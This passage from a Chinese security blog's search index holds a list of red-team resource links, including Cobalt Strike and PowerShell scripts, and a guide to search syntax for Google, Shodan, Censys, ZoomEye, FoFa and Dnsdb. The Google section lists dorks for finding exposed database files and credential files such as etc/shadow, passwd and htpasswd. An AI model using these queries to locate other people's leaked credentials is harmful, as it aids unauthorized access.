href="https://github.com/Orange-Cyberdefense/fenrir-ocd" target="_blank" rel="noopener">https://github.com/Orange-Cyberdefense/fenrir-ocd</a></p><h2 id="团队沟通"><a href="#团队沟通" class="headerlink" title="团队沟通"></a>团队沟通</h2><p>Rocket.Chat：一个功能强大的团队合作聊天工具。</p><p><a href="https://rocket.chat/" target="_blank" rel="noopener">https://rocket.chat/</a></p><p>EtherPad：多人即时文件协作平台。</p><p><a href="https://etherpad.net/" target="_blank" rel="noopener">https://etherpad.net/</a></p><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p>Aggressor脚本：大多数Cobalt Strike对话框和功能都是作为独立模块编写的，这些模块向Aggressor Script引擎提供了一些接口如default.cna定义了默认的Cobalt Strike的工具栏按钮，弹出式菜单，除此之外可以利用提供的API来模拟红队成员与你并肩作战以及扩展跟修改Cobalt Strike的现有功能等。</p><p><a href="https://github.com/invokethreatguy/CSASC" target="_blank" rel="noopener">https://github.com/invokethreatguy/CSASC</a></p><p><a href="https://github.com/secgroundzero/CS-Aggressor-Scripts" target="_blank" rel="noopener">https://github.com/secgroundzero/CS-Aggressor-Scripts</a></p><p><a href="https://github.com/Und3rf10w/Aggressor-scripts" target="_blank" rel="noopener">https://github.com/Und3rf10w/Aggressor-scripts</a></p><p><a href="https://github.com/harleyQu1nn/AggressorScripts" target="_blank" rel="noopener">https://github.com/harleyQu1nn/AggressorScripts</a></p><p><a href="https://github.com/rasta-mouse/Aggressor-Script" target="_blank" rel="noopener">https://github.com/rasta-mouse/Aggressor-Script</a></p><p><a href="https://github.com/RhinoSecurityLabs/Aggressor-Scripts" target="_blank" rel="noopener">https://github.com/RhinoSecurityLabs/Aggressor-Scripts</a></p><p><a href="https://github.com/bluscreenofjeff/AggressorScripts" target="_blank" rel="noopener">https://github.com/bluscreenofjeff/AggressorScripts</a></p><p><a href="https://github.com/001SPARTaN/aggressor_scripts" target="_blank" rel="noopener">https://github.com/001SPARTaN/aggressor_scripts</a></p><h2 id="适用于红队和渗透测试的脚本："><a href="#适用于红队和渗透测试的脚本：" class="headerlink" title="适用于红队和渗透测试的脚本："></a>适用于红队和渗透测试的脚本：</h2><p><a href="https://github.com/FuzzySecurity/PowerShell-Suite" target="_blank" rel="noopener">https://github.com/FuzzySecurity/PowerShell-Suite</a></p><p><a href="https://github.com/nettitude/Powershell" target="_blank" rel="noopener">https://github.com/nettitude/Powershell</a></p><p><a href="https://github.com/Mr-Un1k0d3r/RedTeamPowershellScripts" target="_blank" rel="noopener">https://github.com/Mr-Un1k0d3r/RedTeamPowershellScripts</a></p><p><a href="https://github.com/threatexpress/red-team-scriptsh" target="_blank" rel="noopener">https://github.com/threatexpress/red-team-scriptsh</a></p><p><a href="https://github.com/SadProcessor/SomeStuff" target="_blank" rel="noopener">https://github.com/SadProcessor/SomeStuff</a></p><p><a href="https://github.com/rvrsh3ll/Misc-Powershell-Scripts" target="_blank" rel="noopener">https://github.com/rvrsh3ll/Misc-Powershell-Scripts</a></p><p><a href="https://github.com/enigma0x3/Misc-PowerShell-Stuff" target="_blank" rel="noopener">https://github.com/enigma0x3/Misc-PowerShell-Stuff</a></p><p><a href="https://github.com/ChrisTruncer/PenTestScripts" target="_blank" rel="noopener">https://github.com/ChrisTruncer/PenTestScripts</a></p><p><a href="https://github.com/bluscreenofjeff/Scripts" target="_blank" rel="noopener">https://github.com/bluscreenofjeff/Scripts</a></p><p><a href="https://github.com/xorrior/RandomPS-Scripts" target="_blank" rel="noopener">https://github.com/xorrior/RandomPS-Scripts</a></p><p><a href="https://github.com/xorrior/Random-CSharpTools" target="_blank" rel="noopener">https://github.com/xorrior/Random-CSharpTools</a></p><p><a href="https://github.com/leechristensen/Random" target="_blank" rel="noopener">https://github.com/leechristensen/Random</a></p><p><a href="https://github.com/mgeeky/Penetration-Testing-Tools/tree/master/social-engineering" target="_blank" rel="noopener">https://github.com/mgeeky/Penetration-Testing-Tools/tree/master/social-engineering</a></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>MITRE’s ATT&amp;CK是一个向美国政府提供系统工程、研究开发和信息技术支持的美国非营利性组织。基于ATT&amp;CK（对抗战术、技术与常识）知识库的端点检测和响应（EDR）产品进行评估，以加强行业和客户的网络攻击对策。</p><p><a href="https://attack.mitre.org/wiki/Main_Page" target="_blank" rel="noopener">https://attack.mitre.org/wiki/Main_Page</a></p><p>涵盖多个项目的速查手册（Beacon / Cobalt Strike，PowerView，PowerUp，Empire和PowerSploit）。</p><p><a href="https://github.com/HarmJ0y/CheatSheets" target="_blank" rel="noopener">https://github.com/HarmJ0y/CheatSheets</a></p><p>PRE-ATT&amp;CK对抗战术，技术和通用知识：</p><p><a href="https://attack.mitre.org/pre-attack/index.php/Main_Page" target="_blank" rel="noopener">https://attack.mitre.org/pre-attack/index.php/Main_Page</a></p><p>Adversary OPSEC包括使用各种技术或第三方服务来混淆，隐藏网络流量或系统行为： </p><p><a href="https://attack.mitre.org/pre-attack/index.php/Adversary_OPSEC" target="_blank" rel="noopener">https://attack.mitre.org/pre-attack/index.php/Adversary_OPSEC</a></p><p>为了展示ATT＆CK对于攻击性运营商和防御者的实际使用，MITRE创建了Adversary Emulation Plans： </p><p><a href="https://attack.mitre.org/wiki/Adversary_Emulation_Plans" target="_blank" rel="noopener">https://attack.mitre.org/wiki/Adversary_Emulation_Plans</a></p><p>红色团队维基基础架构：</p><p><a href="https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki" target="_blank" rel="noopener">https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki</a></p><p>Advanced Threat Tactics（高级威胁战术） – 课程和笔记。关于红队运作和对手模拟的免费课程。</p><p><a href="https://blog.cobaltstrike.com/2015/09/30/advanced-threat-tactics-course-and-notes" target="_blank" rel="noopener">https://blog.cobaltstrike.com/2015/09/30/advanced-threat-tactics-course-and-notes</a></p><p>@vysecurityz在Twitter上的关于红队Tips的文章。<a href="https://vincentyiu.co.uk/red-team-tips" target="_blank" rel="noopener">https://vincentyiu.co.uk/red-team-tips</a></p><p>优秀红队资源列表：</p><p><a href="https://github.com/yeyintminthuhtut/Awesome-Red-Teaming" target="_blank" rel="noopener">https://github.com/yeyintminthuhtut/Awesome-Red-Teaming</a></p><p>用于企业软件的ATT＆C：。</p><p><a href="https://attack.mitre.org/wiki/Software" target="_blank" rel="noopener">https://attack.mitre.org/wiki/Software</a></p><p>红队练习计划：</p><p><a href="https://github.com/magoo/redteam-plan" target="_blank" rel="noopener">https://github.com/magoo/redteam-plan</a></p><p>关于锁，保险箱和钥匙安全性的资源精选列表。</p><p><a href="https://github.com/meitar/awesome-lockpicking" target="_blank" rel="noopener">https://github.com/meitar/awesome-lockpicking</a></p><p>优秀的威胁情报资源精选列：</p><p><a href="https://github.com/hslatman/awesome-threat-intelligence" target="_blank" rel="noopener">https://github.com/hslatman/awesome-threat-intelligence</a></p><p>APTnotes是一个按年份排序用于存储各种APT相关的公开可用文档和记录的存储库。</p><p><a href="https://github.com/aptnotes/data" target="_blank" rel="noopener">https://github.com/aptnotes/data</a></p><p>TIBER-EU框架是欧洲首个针对可控网络黑客行为的框架，可在多个当局监督的情况下测试跨境实体的网络弹性。</p><p><a href="http://www.ecb.europa.eu/pub/pdf/other/ecb.tiber_eu_framework.en.pdf" target="_blank" rel="noopener">http://www.ecb.europa.eu/pub/pdf/other/ecb.tiber_eu_framework.en.pdf</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试神器——搜索引擎</title>
      <link href="/aisnnu.github.io/uncategorized/aisnnu0/"/>
      <url>/aisnnu.github.io/uncategorized/aisnnu0/</url>
      
        <content type="html"><![CDATA[<p>搜索引擎是我日常工作中用得最多的一款工具，国内常用的搜索引擎包括Baidu，sougou，bing等。但我本篇要纪录的并不是这些常用的搜索引擎，而是信息安全从业人员必备的几款网络搜索引擎。<br><a id="more"></a><br>本篇要介绍的搜索引擎包括：Shodan，censys，钟馗之眼，Google，FoFa，Dnsdb等。介绍的内容主要是这几款搜索引擎的一些高级语法，掌握高级语法会让搜索结果更准确。</p><h1 id="Google搜索引擎"><a href="#Google搜索引擎" class="headerlink" title="Google搜索引擎"></a>Google搜索引擎</h1><p>这里之所以要介绍google搜索引擎，是因为它有别于百度、搜狗等内容搜索引擎，其在安全界有着非同一般的地位，甚至专门有一名词为google hacking用来形容google与安全非同寻常的关系。</p><h2 id="google基本语法"><a href="#google基本语法" class="headerlink" title="google基本语法"></a>google基本语法</h2><p>Index of/　　使用它可以直接进入网站首页下的所有文件和文件夹中。<br>intext:　　将返回所有在网页正文部分包含关键词的网页。<br>intitle:　　将返回所有网页标题中包含关键词的网页。<br>cache:　　搜索google里关于某些内容的缓存。<br>define:　　搜索某个词语的定义。<br>filetype:　　搜索指定的文件类型，如：.bak，.mdb，.inc等。<br>info:　　查找指定站点的一些基本信息。<br>inurl:　　搜索我们指定的字符是否存在于URL中。<br>Link:　　link:thief.one可以返回所有和thief.one做了链接的URL。<br>site:　　site:thief.one将返回所有和这个站有关的URL。<br>+　　把google可能忽略的字列如查询范围。<br>-　　把某个字忽略，例子：新加 -坡。<br>~　　同意词。<br>.　　单一的通配符。<br>*　　通配符，可代表多个字母。<br>“”　　精确查询。</p><h3 id="搜索不同国家网站"><a href="#搜索不同国家网站" class="headerlink" title="搜索不同国家网站"></a>搜索不同国家网站</h3><p>inurl:tw　　台湾<br>inurl:jp　　日本</p><h3 id="利用google暴库"><a href="#利用google暴库" class="headerlink" title="利用google暴库"></a>利用google暴库</h3><p>利用goole可以搜索到互联网上可以直接下载到的数据库文件，语法如下：</p><p>inurl:editor/db/</p><p>inurl:eWebEditor/db/</p><p>inurl:bbs/data/</p><p>inurl:databackup/</p><p>inurl:blog/data/</p><p>inurl:\boke\data</p><p>inurl:bbs/database/</p><p>inurl:conn.asp</p><p>inc/conn.asp</p><p>Server.mapPath(“.mdb”)</p><p>allinurl:bbs data</p><p>filetype:mdb inurl:database</p><p>filetype:inc conn</p><p>inurl:data filetype:mdb</p><p>intitle:”index of” data</p><h3 id="利用goole搜索敏感信息"><a href="#利用goole搜索敏感信息" class="headerlink" title="利用goole搜索敏感信息"></a>利用goole搜索敏感信息</h3><p>利用google可以搜索一些网站的敏感信息，语法如下:</p><p>intitle:”index of” etc</p><p>intitle:”Index of” .sh_history</p><p>intitle:”Index of” .bash_history</p><p>intitle:”index of” passwd</p><p>intitle:”index of” people.lst</p><p>intitle:”index of” pwd.db</p><p>intitle:”index of” etc/shadow</p><p>intitle:”index of” spwd</p><p>intitle:”index of” master.passwd</p><p>intitle:”index of” htpasswd</p><p>inurl:service.pwd</p><h3 id="利用google搜索C段服务器信息"><a href="#利用google搜索C段服务器信息" class="headerlink" title="利用google搜索C段服务器信息"></a>利用google搜索C段服务器信息</h3><p>site:218.87.21.*</p><p>可通过google可获取218.87.21.0/24网络的服务信息。</p><h1 id="shodan搜索引擎"><a href="#shodan搜索引擎" class="headerlink" title="shodan搜索引擎"></a>shodan搜索引擎</h1><p>shodan网络搜索引擎偏向网络设备以及服务器的搜索，具体内容可上网查阅，这里给出它的高级搜索语法。</p><p>地址：<a href="https://www.shodan.io/" target="_blank" rel="noopener">https://www.shodan.io/</a></p><h2 id="shodan搜索语法"><a href="#shodan搜索语法" class="headerlink" title="shodan搜索语法"></a>shodan搜索语法</h2><p>hostname：　　搜索指定的主机或域名，例如 hostname:”google”</p><p>port：　　搜索指定的端口或服务，例如 port:”21”</p><p>country：　　搜索指定的国家，例如 country:”CN”</p><p>city：　　搜索指定的城市，例如 city:”Hefei”</p><p>org：　　搜索指定的组织或公司，例如 org:”google”</p><p>isp：　　搜索指定的ISP供应商，例如 isp:”China Telecom”</p><p>product：　　搜索指定的操作系统/软件/平台，例如 product:”Apache httpd”</p><p>version：　　搜索指定的软件版本，例如 version:”1.6.2”</p><p>geo：　　搜索指定的地理位置，例如 geo:”31.8639, 117.2808”</p><p>before/after：　　搜索指定收录时间前后的数据，格式为dd-mm-yy，例如 before:”11-11-15”</p><p>net：　　搜索指定的IP地址或子网，例如 net:”210.45.240.0/24”</p><p>以上内容参考：<a href="http://xiaix.me/shodan-xin-shou-ru-keng-zhi-nan/" target="_blank" rel="noopener">http://xiaix.me/shodan-xin-shou-ru-keng-zhi-nan/</a></p><h1 id="censys搜索引擎"><a href="#censys搜索引擎" class="headerlink" title="censys搜索引擎"></a>censys搜索引擎</h1><p>censys搜索引擎功能与shodan类似，以下几个文档信息。</p><p>地址：<a href="https://www.censys.io/" target="_blank" rel="noopener">https://www.censys.io/</a></p><p><a href="https://www.censys.io/certificates/help" target="_blank" rel="noopener">https://www.censys.io/certificates/help</a> 帮助文档</p><p><a href="https://www.censys.io/ipv4?q=" target="_blank" rel="noopener">https://www.censys.io/ipv4?q=</a>  ip查询</p><p><a href="https://www.censys.io/domain?q=" target="_blank" rel="noopener">https://www.censys.io/domain?q=</a>  域名查询</p><p><a href="https://www.censys.io/certificates?q=" target="_blank" rel="noopener">https://www.censys.io/certificates?q=</a> 证书查询</p><h2 id="censys搜索语法"><a href="#censys搜索语法" class="headerlink" title="censys搜索语法"></a>censys搜索语法</h2><p>默认情况下censys支持全文检索。</p><p>23.0.0.0/8 or 8.8.8.0/24　　可以使用and or not</p><p>80.http.get.status_code: 200　　指定状态</p><p>80.http.get.status_code:[200 TO 300]　　200-300之间的状态码</p><p>location.country_code: DE　　国家</p><p>protocols: (“23/telnet” or “21/ftp”)　　协议</p><p>tags: scada　　标签</p><p>80.http.get.headers.server：nginx　　服务器类型版本</p><p>autonomous_system.description: University　　系统描述</p><h1 id="zoomeye钟馗之眼"><a href="#zoomeye钟馗之眼" class="headerlink" title="zoomeye钟馗之眼"></a>zoomeye钟馗之眼</h1><p>钟馗之眼搜索引擎偏向web应用层面的搜索。</p><p>地址：<a href="https://www.zoomeye.org/" target="_blank" rel="noopener">https://www.zoomeye.org/</a></p><h2 id="zoomeye钟馗之眼搜索语法"><a href="#zoomeye钟馗之眼搜索语法" class="headerlink" title="zoomeye钟馗之眼搜索语法"></a>zoomeye钟馗之眼搜索语法</h2><p>app:nginx　　组件名</p><p>ver:1.0　　版本</p><p>os:windows　　操作系统</p><p>country:”China”　　国家</p><p>city:”hangzhou”　　城市</p><p>port:80　　端口</p><p>hostname:google　　主机名</p><p>site:thief.one　　网站域名</p><p>desc:nmask　　描述</p><p>keywords:nmask’blog　　关键词</p><p>service:ftp　　服务类型</p><p>ip:8.8.8.8　　ip地址</p><p>cidr:8.8.8.8/24　　ip地址段</p><h1 id="FoFa搜索引擎"><a href="#FoFa搜索引擎" class="headerlink" title="FoFa搜索引擎"></a>FoFa搜索引擎</h1><p>FoFa搜索引擎偏向资产搜索。</p><p>地址：<a href="https://fofa.so" target="_blank" rel="noopener">https://fofa.so</a></p><h2 id="FoFa搜索语法"><a href="#FoFa搜索语法" class="headerlink" title="FoFa搜索语法"></a>FoFa搜索语法</h2><p>title=”abc” 从标题中搜索abc。例：标题中有北京的网站。</p><p>header=”abc” 从http头中搜索abc。例：jboss服务器。</p><p>body=”abc” 从html正文中搜索abc。例：正文包含Hacked by。</p><p>domain=”qq.com” 搜索根域名带有qq.com的网站。例： 根域名是qq.com的网站。</p><p>host=”.gov.cn” 从url中搜索.gov.cn,注意搜索要用host作为名称。</p><p>port=”443” 查找对应443端口的资产。例： 查找对应443端口的资产。</p><p>ip=”1.1.1.1” 从ip中搜索包含1.1.1.1的网站,注意搜索要用ip作为名称。</p><p>protocol=”https” 搜索制定协议类型(在开启端口扫描的情况下有效)。例： 查询https协议资产。</p><p>city=”Beijing” 搜索指定城市的资产。例： 搜索指定城市的资产。</p><p>region=”Zhejiang” 搜索指定行政区的资产。例： 搜索指定行政区的资产。</p><p>country=”CN” 搜索指定国家(编码)的资产。例： 搜索指定国家(编码)的资产。</p><p>cert=”google.com” 搜索证书(https或者imaps等)中带有google.com的资产。</p><h2 id="高级搜索"><a href="#高级搜索" class="headerlink" title="高级搜索"></a>高级搜索</h2><p>title=”powered by” &amp;&amp; title!=discuz</p><p>title!=”powered by” &amp;&amp; body=discuz</p><p>( body=”content=\”WordPress” || (header=”X-Pingback” &amp;&amp; header=”/xmlrpc.php” &amp;&amp; body=”/wp-includes/“) ) &amp;&amp; host=”gov.cn”</p><h1 id="Dnsdb搜索引擎"><a href="#Dnsdb搜索引擎" class="headerlink" title="Dnsdb搜索引擎"></a>Dnsdb搜索引擎</h1><p>dnsdb搜索引擎是一款针对dbs解析的查询平台。</p><p>地址：<a href="https://www.dnsdb.io/" target="_blank" rel="noopener">https://www.dnsdb.io/</a></p><h2 id="Dnsdb搜索语法"><a href="#Dnsdb搜索语法" class="headerlink" title="Dnsdb搜索语法"></a>Dnsdb搜索语法</h2><p>DnsDB查询语法结构为条件1 条件2 条件3 …., 每个条件以空格间隔, DnsDB 会</p><p>把满足所有查询条件的结果返回给用户.</p><h3 id="域名查询条件"><a href="#域名查询条件" class="headerlink" title="域名查询条件"></a>域名查询条件</h3><p>域名查询是指查询顶级私有域名所有的DNS记录, 查询语法为domain:.</p><p>例如查询google.com 的所有DNS记录: domain:google.com.</p><p>域名查询可以省略domain:.</p><h3 id="主机查询条件"><a href="#主机查询条件" class="headerlink" title="主机查询条件"></a>主机查询条件</h3><p>查询语法:host:</p><p>例如查询主机地址为mp3.example.com的DNS记录: host:map3.example.com</p><p>主机查询条件与域名查询查询条件的区别在于, 主机查询匹配的是DNS记录的Host值</p><h3 id="按DNS记录类型查询"><a href="#按DNS记录类型查询" class="headerlink" title="按DNS记录类型查询"></a>按DNS记录类型查询</h3><p>查询语法: type:.<br>例如只查询A记录: type:a<br>使用条件:必须存在domain:或者host:条件,才可以使用type:查询语法</p><h3 id="按IP限制"><a href="#按IP限制" class="headerlink" title="按IP限制"></a>按IP限制</h3><p>查询语法: ip:<br>查询指定IP: ip:8.8.8.8, 该查询与直接输入8.8.8.8进行查询等效<br>查询指定IP范围: ip:8.8.8.8-8.8.255.255<br>CIDR: ip:8.8.0.0/24<br>IP最大范围限制65536个</p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
